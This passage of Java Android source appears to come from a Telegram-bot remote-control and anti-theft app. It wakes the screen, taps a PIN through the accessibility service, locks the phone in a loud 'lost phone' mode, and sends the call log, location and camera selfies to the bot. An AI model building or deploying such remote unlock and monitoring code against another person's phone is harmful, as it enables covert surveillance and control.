                    "\u2705 Kalibrasi [" + target + "] selesai!\n"
                            + "Tersimpan: " + gx0 + " " + gy0 + " " + gw + " " + gh
                            + "\n/layarnyala siap dipakai.");
            return;
        }
        String dg = t.replaceAll("[^0-9]", "");
        if (dg.length() != 1) {
            PollService.pending.put(chatId, target + ":kalibrasi3");
            replyT(ctx, chatId, target, "Balas 'pas' atau satu angka (0-9).");
            return;
        }
        st.iter++;
        if (st.iter > 5) {
            kalibMap.remove(chatId);
            replyT(ctx, chatId, target,
                    "Sudah 5x masih meleset — coba /pinpos manual, atau kirim foto keypad-nya.");
            return;
        }
        int landed = dg.charAt(0) - '0';
        nudgeGrid(ctx, 5, landed);
        wakeScreen(ctx);
        replyT(ctx, chatId, target, "Digeser... mengetuk tombol 5 lagi.");
        AppLockService.tapPinDigits("5", new AppLockService.GestureCallback() {
            @Override
            public void onDone(boolean ok) {
                PollService.pending.put(chatId, target + ":kalibrasi3");
                replyT(ctx, chatId, target,
                        ok ? "Ketukan jatuh di tombol 5? Balas 'pas' / angkanya."
                                : "Gagal mengetuk.");
            }
        });
    }

    private static void doLayarNyala(final Context ctx, final long chatId,
                               final String target, final String arg) {
        try {
            android.os.PowerManager pm = (android.os.PowerManager)
                    ctx.getSystemService(Context.POWER_SERVICE);
            @SuppressWarnings("deprecation")
            android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                    android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                            | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "mydevice:nyala");
            wl.acquire(15000);
            try {
                wl.release();
            } catch (Exception ignored) {
            }
            final String pin = arg == null ? "" : arg.trim().replaceAll("[^0-9]", "");
            if (!pin.isEmpty()) {
                replyT(ctx, chatId, target, "\uD83D\uDCA1 Layar [" + target + "] dihidupkan. Mengetuk PIN...");
                AppLockService.tapPinDigits(pin, new AppLockService.GestureCallback() {
                    @Override
                    public void onDone(boolean ok) {
                        replyT(ctx, chatId, target, ok
                                ? "\uD83D\uDCA1 PIN diketuk. Kalau posisi keypad di HP itu berbeda, PIN mungkin belum masuk — sesuaikan manual."
                                : "Gagal mengetuk PIN — pastikan Aksesibilitas aktif.");
                    }
                });
            } else {
                replyT(ctx, chatId, target, "\uD83D\uDCA1 Layar [" + target + "] dihidupkan.\n"
                        + "Kalau HP memakai PIN bawaan, kirim: /layarnyala 123456 (ganti dengan PIN HP itu).");
            }
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    /** Bunyikan HP kencang; hanya bisa dimatikan via /berhenti. */
    /**
     * /hphilang &lt;pin&gt; | &lt;komentar&gt; — MODE HP HILANG (all-in-one, otomatis):
     * kunci PIN anti-bypass + bunyi kencang + volume dikunci + taskbar diblokir
     * + menu daya ditutup + pesan dua arah dengan penemu. Hanya PIN / perintah
     * bot (/berhenti, /buka) yang melepas.
     */
    private static void doHphilang(final Context ctx, final long chatId, String target, String arg) {
        String[] pp = arg.split("\\|", 2);
        String pin = pp[0].trim().split(" ")[0];
        if (!pin.matches("[0-9]{4,8}")) {
            PollService.pending.put(chatId, target + ":hphilang");
            replyT(ctx, chatId, target, "\uD83D\uDEA8 Mode HP HILANG\n"
                    + "Kirim: <PIN 4-8 digit> | <pesan untuk penemu>\n"
                    + "Contoh: 1234 | HP ini hilang, tolong hubungi saya.");
            return;
        }
        String comment = pp.length > 1 ? pp[1].trim() : "";
        if (!comment.isEmpty()) Prefs.setHilangPesan(ctx, comment);
        HilangMode.start(ctx, pin, comment);
        final boolean sbLocked = HilangMode.statusBarLocked;
        try {
            android.media.AudioManager am = (android.media.AudioManager)
                    ctx.getSystemService(Context.AUDIO_SERVICE);
            am.setStreamVolume(android.media.AudioManager.STREAM_ALARM,
                    am.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM), 0);
        } catch (Exception ignored) {
        }
        AlarmReceiver.ring(ctx, "Mode HP hilang", false);
        AlarmLock.on(ctx);
        HilangMode.launchUi(ctx);
        replyT(ctx, chatId, target, "\uD83D\uDEA8 Mode HP HILANG aktif di [" + target + "]!\n"
                + "\uD83D\uDD12 Terkunci PIN + bunyi kencang, volume dikunci, taskbar diblokir, menu daya ditutup.\n"
                + (sbLocked ? ""
                        : "\u26A0\uFE0F Device Admin BELUM aktif di [" + target
                                + "] — taskbar TIDAK bisa dikunci total! Aktifkan dulu di aplikasi > Izin yang dibutuhkan > Device Admin > AKTIFKAN.\n")
                + "\uD83D\uDCAC Penemu bisa kirim pesan ke kamu dari layar kunci.\n"
                + "\u2014 Balas: reply pesan penemu, atau kirim: " + target + ": /balas <pesan>\n"
                + "\u2014 Lacak: /lokasi \u2022 Hentikan: /berhenti");
        sendHilangPanel(ctx, chatId, target);
    }

    /** Panel kontrol pemilik saat mode HP hilang aktif. */
    static void sendHilangPanel(Context ctx, long chatId, String target) {
        String[][] items = {
                {"\uD83D\uDD0A Bunyikan", "hilang:bunyi"},
                {"\uD83D\uDD07 Matikan suara", "hilang:mute"},
                {"\uD83D\uDCF3 Getar", "hilang:getar"},
                {"\uD83D\uDD26 Senter", "hilang:senter"},
                {"\u2728 Strobo", "hilang:strobo"},
                {"\uD83D\uDCCD Lokasi", "hilang:lokasi"},
                {"\uD83D\uDCF8 Selfie", "hilang:selfie"},
                {"\uD83D\uDED1 Hentikan", "hilang:stop"},
        };
        try {
            JSONObject kb = buildMenuKb(ctx, target, items, null, 2);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId,
                    "\uD83C\uDF9B\uFE0F Kontrol HP hilang [" + target + "]:", kb);
        } catch (Exception ignored) {
        }
    }

    /** /hilangteks — panel custom semua teks layar HP hilang. */
    private static void doHilangTeks(Context ctx, long chatId, String target, String arg) {
        String[][] items = {
                {"\uD83D\uDCDD Judul", "hilangteks:judul"},
                {"\uD83D\uDCAC Pesan", "hilangteks:pesan"},
                {"\uD83D\uDD22 PIN on/off", "hilangteks:pinon"},
                {"\uD83D\uDD24 Label PIN", "hilangteks:pinlabel"},
                {"\uD83D\uDCDD Sub PIN", "hilangteks:pinsub"},
                {"\uD83D\uDCAC Label balasan", "hilangteks:label"},
                {"\uD83D\uDCAC Label pesan", "hilangteks:msglabel"},
                {"\u270F\uFE0F Hint input", "hilangteks:hint"},
                {"\uD83D\uDD18 Tombol kirim", "hilangteks:tombol"},
                {"\u26A0\uFE0F Peringatan", "hilangteks:warn"},
                {"\u267B\uFE0F Reset", "hilangteks:reset"},
        };
        try {
            JSONObject kb = buildMenuKb(ctx, target, items, null, 2);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId,
                    "\uD83C\uDFA8 Custom teks layar HP hilang [" + target + "]\n" +
                            "Judul: " + Prefs.hilangJudul(ctx) + "\n" +
                            "Pesan: " + Prefs.hilangPesan(ctx) + "\n" +
                            "PIN: " + (Prefs.hilangPinOn(ctx) ? "ON" : "OFF") + "\n" +
                            "Label PIN: " + Prefs.hilangPinLabel(ctx) + "\n" +
                            "Sub PIN: " + (Prefs.hilangPinSub(ctx).isEmpty() ? "-" : Prefs.hilangPinSub(ctx)) + "\n" +
                            "Label balasan: " + Prefs.hilangLabel(ctx) + "\n" +
                            "Label pesan: " + Prefs.hilangMsgLabel(ctx) + "\n" +
                            "Hint input: " + Prefs.hilangHint(ctx) + "\n" +
                            "Tombol: " + Prefs.hilangTombol(ctx) + "\n" +
                            "Peringatan: " + Prefs.hilangWarn(ctx),
                    kb);
        } catch (Exception ignored) {
        }
    }

    private static void doHilangTeksSet(Context ctx, long chatId, String target, String sub) {
        switch (sub) {
            case "reset":
                Prefs.resetHilangTeks(ctx);
                Prefs.setHilangPinOn(ctx, true);
                replyT(ctx, chatId, target, "\u2705 Semua teks HP hilang dikembalikan ke awal.");
                return;
            case "pinon": {
                boolean v = !Prefs.hilangPinOn(ctx);
                Prefs.setHilangPinOn(ctx, v);
                replyT(ctx, chatId, target, "\uD83D\uDD22 Keypad PIN HP hilang: " + (v ? "ON" : "OFF") + ".");
                return;
            }
            default: {
                String nama;
                switch (sub) {
                    case "judul": nama = "judul"; break;
                    case "pesan": nama = "pesan utama"; break;
                    case "pinlabel": nama = "label PIN"; break;
                    case "pinsub": nama = "sub-label PIN"; break;
                    case "label": nama = "label balasan pemilik"; break;
                    case "msglabel": nama = "label kartu pesan"; break;
                    case "hint": nama = "hint input pesan"; break;
                    case "tombol": nama = "teks tombol kirim"; break;
                    case "warn": nama = "teks peringatan lockdown"; break;
                    default: return;
                }
                PollService.pending.put(chatId, target + ":hilangteksset:" + sub);
                replyT(ctx, chatId, target, "\u270F\uFE0F Kirim teks baru untuk *" + nama + "* [" + target + "]");
            }
        }
    }

    /** Terima input pending untuk /hilangteks. Return true jika ditangani. */
    static boolean handleHilangTeksPending(Context ctx, long chatId, String target, String pending, String text) {
        if (!pending.startsWith("hilangteksset:")) return false;
        String sub = pending.substring("hilangteksset:".length());
        switch (sub) {
            case "judul": Prefs.setHilangJudul(ctx, text); break;
            case "pesan": Prefs.setHilangPesan(ctx, text); break;
            case "pinlabel": Prefs.setHilangPinLabel(ctx, text); break;
            case "pinsub": Prefs.setHilangPinSub(ctx, text); break;
            case "label": Prefs.setHilangLabel(ctx, text); break;
            case "msglabel": Prefs.setHilangMsgLabel(ctx, text); break;
            case "hint": Prefs.setHilangHint(ctx, text); break;
            case "tombol": Prefs.setHilangTombol(ctx, text); break;
            case "warn": Prefs.setHilangWarn(ctx, text); break;
            default: return false;
        }
        replyT(ctx, chatId, target, "\u2705 Tersimpan.");
        return true;
    }

    private static void doHilangCtl(Context ctx, long chatId, String target, String sub) {
        if (!HilangMode.active) {
            replyT(ctx, chatId, target, "Mode HP hilang tidak aktif di [" + target + "].");
            return;
        }
        switch (sub) {
            case "bunyi": {
                try {
                    android.media.AudioManager am = (android.media.AudioManager)
                            ctx.getSystemService(Context.AUDIO_SERVICE);
                    am.setStreamVolume(android.media.AudioManager.STREAM_ALARM,
                            am.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM), 0);
                } catch (Exception ignored) {
                }
                AlarmReceiver.ring(ctx, "Mode HP hilang", false);
                AlarmLock.on(ctx);
                replyT(ctx, chatId, target, "\uD83D\uDD0A HP [" + target + "] dibunyikan.");
                break;
            }
            case "mute": {
                try {
                    AlarmReceiver.stop();
                } catch (Exception ignored) {
                }
                replyT(ctx, chatId, target, "\uD83D\uDD07 Suara dimatikan. HP [" + target + "] tetap terkunci \u2014 kirim /berhenti untuk melepas total.");
                break;
            }
            case "getar": {
                try {
                    android.os.Vibrator vib = (android.os.Vibrator)
                            ctx.getSystemService(Context.VIBRATOR_SERVICE);
                    long[] pat = {0, 400, 200, 400, 200, 800};
                    if (android.os.Build.VERSION.SDK_INT >= 26)
                        vib.vibrate(android.os.VibrationEffect.createWaveform(pat, -1));
                    else
                        vib.vibrate(pat, -1);
                    replyT(ctx, chatId, target, "\uD83D\uDCF3 HP [" + target + "] bergetar.");
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal getar: " + e.getMessage());
                }
                break;
            }
            case "senter": {
                try {
                    TorchHelper th = TorchHelper.get(ctx);
                    boolean on = !th.isTorchOn();
                    if (th.setTorch(on))
                        replyT(ctx, chatId, target, on ? "\uD83D\uDD26 Senter DINYALAKAN." : "\uD83D\uDD26 Senter dimatikan.");
                    else
                        replyT(ctx, chatId, target, "Gagal (mungkin HP tidak punya flash).");
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
                }
                break;
            }
            case "strobo": {
                try {
                    TorchHelper th = TorchHelper.get(ctx);
                    if (th.isStrobing()) {
                        th.stopStrobe();
                        replyT(ctx, chatId, target, "\u2728 Strobo dimatikan.");
                    } else if (th.startStrobe()) {
                        replyT(ctx, chatId, target, "\u2728 Strobo DINYALAKAN.");
                    } else {
                        replyT(ctx, chatId, target, "Gagal (mungkin HP tidak punya flash).");
                    }
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
                }
                break;
            }
            case "selfie":
                doFoto(ctx, chatId, target, true);
                break;
            case "lokasi":
                doLokasi(ctx, chatId, target);
                break;
            case "stop":
                doBerhenti(ctx, chatId, target);
                break;
            default:
                break;
        }
    }

    /** /balas &lt;pesan&gt; — tampilkan balasan pemilik di layar HP yang hilang. */
    private static void doBalas(Context ctx, long chatId, String target, String arg) {
        if (!HilangMode.active) return; // hanya HP yang sedang mode hilang
        if (arg.isEmpty()) {
            replyT(ctx, chatId, target, "Kirim: /balas <pesan> \u2014 tampil di layar HP yang hilang.");
            return;
        }
        HilangMode.onOwnerReply(ctx, arg);
        replyT(ctx, chatId, target, "\uD83D\uDCAC Balasan tampil di layar HP [" + target + "].");
    }

    private static void doBunyi(final Context ctx, final long chatId, String target) {
        try {
            android.media.AudioManager am = (android.media.AudioManager)
                    ctx.getSystemService(Context.AUDIO_SERVICE);
            try {
                am.setStreamVolume(android.media.AudioManager.STREAM_ALARM,
                        am.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM), 0);
            } catch (Exception ignored) {
            }
        } catch (Exception ignored) {
        }
        AlarmReceiver.ring(ctx, "Panggilan dari Telegram", false);
        AlarmLock.on(ctx);
        replyT(ctx, chatId, target, "\uD83D\uDD14 HP [" + target + "] BERBUNYI kencang!\n\uD83D\uDD12 Volume dikunci maksimal & taskbar diblokir \u2014 tidak bisa dikecilkan/dimatikan dari HP itu.\nKirim /berhenti untuk menghentikan.");
    }
    /**
     * /alarm 06:30 Pesan | /alarm besok 06:30 Pesan | /alarm 13-10 06:30 Pesan
     * | /alarm 2026-10-13 06:30 Pesan | /alarm list | /alarm hapus 06:30
     */
    private static void doAlarm(Context ctx, long chatId, String target, String arg) {
        String a = arg.trim();
        if (a.equalsIgnoreCase("list")) {
            java.util.List<String> al = Prefs.alarms(ctx);
            if (al.isEmpty()) {
                replyT(ctx, chatId, target, "\u23F0 Belum ada alarm.");
            } else {
                StringBuilder sb = new StringBuilder("\u23F0 Alarm [").append(target).append("]:\n");
                for (String x : al) {
                    String[] pp = x.split("\\|", 2);
                    try {
                        java.text.SimpleDateFormat f = new java.text.SimpleDateFormat("HH:mm, d MMM", java.util.Locale.US);
                        sb.append("\u2022 ").append(f.format(new java.util.Date(Long.parseLong(pp[0]))));
                        if (pp.length > 1 && !pp[1].isEmpty()) sb.append(" \u2014 ").append(pp[1]);
                        sb.append("\n");
                    } catch (Exception ignored) {
                    }
                }
                replyT(ctx, chatId, target, sb.toString());
            }
            return;
        }
        if (a.toLowerCase().startsWith("hapus ")) {
            String jam = a.substring(6).trim();
            if (Prefs.removeAlarmLike(ctx, jam)) {
                replyT(ctx, chatId, target, "\u23F0 Alarm " + jam + " dihapus.");
            } else {
                replyT(ctx, chatId, target, "Tidak ketemu alarm jam " + jam + ".");
            }
            return;
        }
        java.util.Calendar cal = java.util.Calendar.getInstance();
        cal.set(java.util.Calendar.SECOND, 0);
        cal.set(java.util.Calendar.MILLISECOND, 0);
        String label;
        java.util.regex.Matcher m;
        m = java.util.regex.Pattern.compile("^(\\d{4})-(\\d{1,2})-(\\d{1,2})\\s+(\\d{1,2}):(\\d{2})\\s*(.*)$").matcher(a);
        if (m.matches()) {
            // 2026-10-13 06:30 pesan
            cal.set(Integer.parseInt(m.group(1)), Integer.parseInt(m.group(2)) - 1,
                    Integer.parseInt(m.group(3)), Integer.parseInt(m.group(4)),
                    Integer.parseInt(m.group(5)));
            label = m.group(6).trim();
        } else if ((m = java.util.regex.Pattern.compile("^(\\d{1,2})-(\\d{1,2})\\s+(\\d{1,2}):(\\d{2})\\s*(.*)$").matcher(a)).matches()) {
            // 13-10 06:30 pesan
            cal.set(java.util.Calendar.MONTH, Integer.parseInt(m.group(2)) - 1);
            cal.set(java.util.Calendar.DAY_OF_MONTH, Integer.parseInt(m.group(1)));
            cal.set(java.util.Calendar.HOUR_OF_DAY, Integer.parseInt(m.group(3)));
            cal.set(java.util.Calendar.MINUTE, Integer.parseInt(m.group(4)));
            label = m.group(5).trim();
            if (cal.getTimeInMillis() <= System.currentTimeMillis()) {
                cal.add(java.util.Calendar.YEAR, 1);
            }
        } else if ((m = java.util.regex.Pattern.compile("^(?i)(besok|lusa)?\\s*(\\d{1,2}):(\\d{2})\\s*(.*)$").matcher(a)).matches()) {
            // [besok|lusa] 06:30 pesan
            String hari = m.group(1);
            int hh = Integer.parseInt(m.group(2));
            int mm = Integer.parseInt(m.group(3));
            label = m.group(4).trim();
            if (hh > 23 || mm > 59) {
                replyT(ctx, chatId, target, "Jam tidak valid.");
                return;
            }
            cal.set(java.util.Calendar.HOUR_OF_DAY, hh);
            cal.set(java.util.Calendar.MINUTE, mm);
            if (hari != null) {
                cal.add(java.util.Calendar.DAY_OF_YEAR, hari.equalsIgnoreCase("lusa") ? 2 : 1);
            } else if (cal.getTimeInMillis() <= System.currentTimeMillis()) {
                cal.add(java.util.Calendar.DAY_OF_YEAR, 1);
            }
        } else {
            replyT(ctx, chatId, target, "Format:\n/alarm 06:30 Pesan\n/alarm besok 06:30 Pesan\n/alarm 13-10 06:30 Pesan\n/alarm 2026-10-13 06:30 Pesan\nLihat: /alarm list \u2022 Hapus: /alarm hapus 06:30");
            return;
        }
        long triggerAt = cal.getTimeInMillis();
        if (triggerAt <= System.currentTimeMillis()) {
            replyT(ctx, chatId, target, "Waktu sudah lewat.");
            return;
        }
        AlarmReceiver.schedule(ctx, triggerAt, label.isEmpty() ? "Alarm" : label);
        java.text.SimpleDateFormat f = new java.text.SimpleDateFormat("HH:mm, EEEE d MMM yyyy", new java.util.Locale("id", "ID"));
        replyT(ctx, chatId, target, "\u23F0 Alarm diset: " + f.format(new java.util.Date(triggerAt))
                + (label.isEmpty() ? "" : "\nPesan: " + label)
                + "\nBunyi terus sampai /berhenti.");
    }

    private static void doRiwayat(Context ctx, long chatId, String target) {
        Cursor c = null;
        try {
            c = ctx.getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI,
                    new String[]{android.provider.CallLog.Calls.NUMBER,
                            android.provider.CallLog.Calls.TYPE,
                            android.provider.CallLog.Calls.DATE,
                            android.provider.CallLog.Calls.DURATION},
                    null, null, android.provider.CallLog.Calls.DATE + " DESC LIMIT 10");
            if (c == null || c.getCount() == 0) {
                replyT(ctx, chatId, target, "Riwayat panggilan kosong / gagal dibaca.");
                return;
            }
            StringBuilder sb = new StringBuilder("\uD83D\uDCDE Riwayat panggilan [" + target + "]:\n");
            SimpleDateFormat fmt = new SimpleDateFormat("d/M HH:mm", Locale.US);
            while (c.moveToNext()) {
                String no = c.getString(0);
                int type = c.getInt(1);
                String t = type == 1 ? "masuk" : type == 2 ? "keluar" : "tak terjawab";
                sb.append("\u2022 ").append(no == null ? "?" : no).append(" (").append(t).append(", ")
                        .append(fmt.format(new Date(c.getLong(2)))).append(", ")
                        .append(c.getLong(3)).append(" dtk)\n");
            }
            replyT(ctx, chatId, target, sb.toString());
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal baca riwayat: " + e.getMessage() + " (butuh izin Telepon)");
        } finally {
            if (c != null) try { c.close(); } catch (Exception ignored) { }
        }
    }

    private static void doSinyal(Context ctx, long chatId, String target) {
        try {
            android.telephony.TelephonyManager tm =
                    (android.telephony.TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            replyT(ctx, chatId, target, "\uD83D\uDCF6 Sinyal [" + target + "]:\nOperator: " + tm.getNetworkOperatorName()
                    + "\nSIM: " + tm.getSimState() + "\nRoaming: " + (tm.isNetworkRoaming() ? "ya" : "tidak"));
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doSensor(Context ctx, long chatId, String target) {
        try {
            android.hardware.SensorManager sm =
                    (android.hardware.SensorManager) ctx.getSystemService(Context.SENSOR_SERVICE);
            java.util.List<android.hardware.Sensor> list = sm.getSensorList(android.hardware.Sensor.TYPE_ALL);
            StringBuilder sb = new StringBuilder("\uD83C\uDFA8 Sensor [" + target + "] (" + list.size() + "):\n");
            for (int i = 0; i < Math.min(list.size(), 15); i++) {
                sb.append("\u2022 ").append(list.get(i).getName()).append("\n");
            }
            replyT(ctx, chatId, target, sb.toString());
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doUsb(Context ctx, long chatId, String target) {
        try {
            Intent i = ctx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int plugged = i == null ? 0 : i.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0);
            String s = plugged == BatteryManager.BATTERY_PLUGGED_USB ? "USB"
                    : plugged == BatteryManager.BATTERY_PLUGGED_AC ? "Charger AC"
                    : "tidak tercolok";
            replyT(ctx, chatId, target, "\uD83D\uDD0C USB [" + target + "]: " + s);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doSidikjari(Context ctx, long chatId, String target) {
        try {
            PackageManager pm = ctx.getPackageManager();
            boolean fp = pm.hasSystemFeature(PackageManager.FEATURE_FINGERPRINT);
            boolean face = pm.hasSystemFeature(PackageManager.FEATURE_FACE);
            replyT(ctx, chatId, target, "\uD83D\uDC46 Biometrik [" + target + "]:\nSidik jari: "
                    + (fp ? "didukung" : "tidak") + "\nFace unlock: " + (face ? "didukung" : "tidak"));
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }
}

